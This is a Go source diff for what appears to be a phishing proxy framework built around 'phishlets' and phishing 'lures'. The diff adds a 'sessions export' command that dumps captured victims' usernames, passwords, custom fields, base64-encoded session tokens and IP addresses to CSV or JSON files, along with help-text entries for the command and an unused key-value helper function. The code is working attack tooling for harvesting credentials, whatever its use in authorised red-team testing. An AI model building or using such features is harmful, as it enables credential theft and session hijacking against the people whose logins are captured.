@@ -1,6 +1,7 @@
 package core
 
 import (
+	"bytes"
 	"bufio"
 	"crypto/rc4"
 	"encoding/base64"
@@ -466,10 +467,85 @@ func (t *Terminal) handleSessions(args []string) error {
 				return nil
 			}
 		}
+	} else if pn == 3 {
+		switch args[0] {
+		case "export":
+			outFile, err := os.Create(args[2])
+			if err != nil {
+				return err
+			}
+			defer outFile.Close()
+			sessions, err := t.db.ListSessions()
+			if err != nil {
+				return err
+			}
+			if len(sessions) == 0 {
+				log.Info("no saved sessions found")
+				return nil
+			}
+			switch args[1] {
+			case "csv":
+				wr := csv.NewWriter(outFile)
+				wr.Write([]string{"Id", "Phishlet", "Username", "Password", "Tokens (base64 encoded)", "Remote IP", "Time"})
+				for _, s := range sessions {
+					pl, err := t.cfg.GetPhishlet(s.Phishlet)
+					if err != nil {
+						log.Error("%v", err)
+						break
+					}
+					base64tokens := base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens)))
+					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
+				}
+				wr.Flush()
+				log.Info("exported sessions to csv: %s", outFile.Name())
+			case "json":
+				type ExportedSession struct {
+					Id string `json:"id"`
+					Phishlet string `json:"phishlet"`
+					Username string `json:"username"`
+					Password string `json:"password"`
+					Custom map[string]string `json:"custom"`
+					Tokens string `json:"tokens_base64_encoded"`
+					RemoteAddr string `json:"remote_ip"`
+					Time string `json:"time"`
+				}
+				var exported []*ExportedSession
+				for _, s := range sessions {
+					pl, err := t.cfg.GetPhishlet(s.Phishlet)
+					if err != nil {
+						log.Error("%v", err)
+						break
+					}
+					es := &ExportedSession{
+						Id: strconv.Itoa(s.Id),
+						Phishlet: s.Phishlet,
+						Username: s.Username,
+						Password: s.Password,
+						Custom: s.Custom,
+						Tokens: base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
+						RemoteAddr: s.RemoteAddr,
+						Time: time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
+					}
+					exported = append(exported, es)
+				}
+				json, _ := json.Marshal(exported)
+				_, err := outFile.Write(json)
+				if err != nil {
+					return err
+				}
+				log.Info("exported sessions to json: %s", outFile.Name())
+			}
+		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
 }
-
+func createKeyValuePairs(m map[string]string) string {
+    b := new(bytes.Buffer)
+    for key, value := range m {
+        fmt.Fprintf(b, "%s=\"%s\"\n", key, value)
+    }
+    return b.String()
+}
 func (t *Terminal) handlePhishlets(args []string) error {
 	pn := len(args)
 
@@ -997,11 +1073,13 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
-		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
+		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all")), readline.PcItem("export", readline.PcItem("csv"), readline.PcItem("json"))))
 	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
+	h.AddSubCommand("sessions", []string{"export", "csv"}, "export csv <output-file>", "export sessions in csv format to <output-file>")
+	h.AddSubCommand("sessions", []string{"export", "json"}, "export json <output-file>", "export sessions in json format to <output-file>")
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		/*		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
